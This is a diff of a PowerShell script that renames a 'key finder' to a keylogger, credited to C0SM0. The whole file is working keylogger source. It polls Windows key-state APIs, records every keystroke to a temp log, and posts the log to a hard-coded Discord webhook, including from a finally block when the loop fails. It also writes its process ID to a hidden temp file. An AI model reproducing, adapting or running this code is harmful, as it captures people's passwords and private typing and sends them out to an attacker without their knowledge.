@@ -1,11 +1,15 @@
-# powershell key finder
+# powershell keylogger
+# created by : C0SM0
 
-
+# webhook, CHANGE ME
 $webhook = "https://discord.com/api/webhooks/997918215244103730/R3_qp6UVV9u-JQHDThMZ8KMg9uL8zfG2Z4qLBIRWyOatCwWXsuml31SEsAYNm8oUw0_4"
+
 # write pid
 $PID > "$env:temp/DdBPKCytRe"
-# key finder
-function KeyFinder($logFile="$env:temp/$env:UserName.log") {
+
+# keylogger
+function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+
   # webhook process
   $logs = Get-Content "$logFile" | Out-String
   $Body = @{
@@ -13,8 +17,10 @@ function KeyFinder($logFile="$env:temp/$env:UserName.log") {
     'content' = $logs
   }
   Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
+
   # generate log file
   $generateLog = New-Item -Path $logFile -ItemType File -Force
+
   # API signatures
   $APIsignatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
@@ -26,24 +32,32 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
+
  # set up API
  $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
+
   # attempt to log keystrokes
   try {
     while ($true) {
       Start-Sleep -Milliseconds 40
+
       for ($ascii = 9; $ascii -le 254; $ascii++) {
+
         # use API to get key state
         $keystate = $API::GetAsyncKeyState($ascii)
+
         # use API to detect keystroke
         if ($keystate -eq -32767) {
           $null = [console]::CapsLock
+
           # map virtual key
           $mapKey = $API::MapVirtualKey($ascii, 3)
+
           # create a stringbuilder
-         $keyboardState = New-Object Byte[] 256
+          $keyboardState = New-Object Byte[] 256
           $hideKeyboardState = $API::GetKeyboardState($keyboardState)
           $loggedchar = New-Object -TypeName System.Text.StringBuilder
+
           # translate virtual key
           if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
             # add logged key to file
@@ -53,11 +67,13 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
       }
     }
   }
+
   # send logs if code fails
   finally {
     # send logs via webhook
     Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
   }
 }
-# run key finder
-KeyFinder
+
+# run keylogger
+KeyLogger
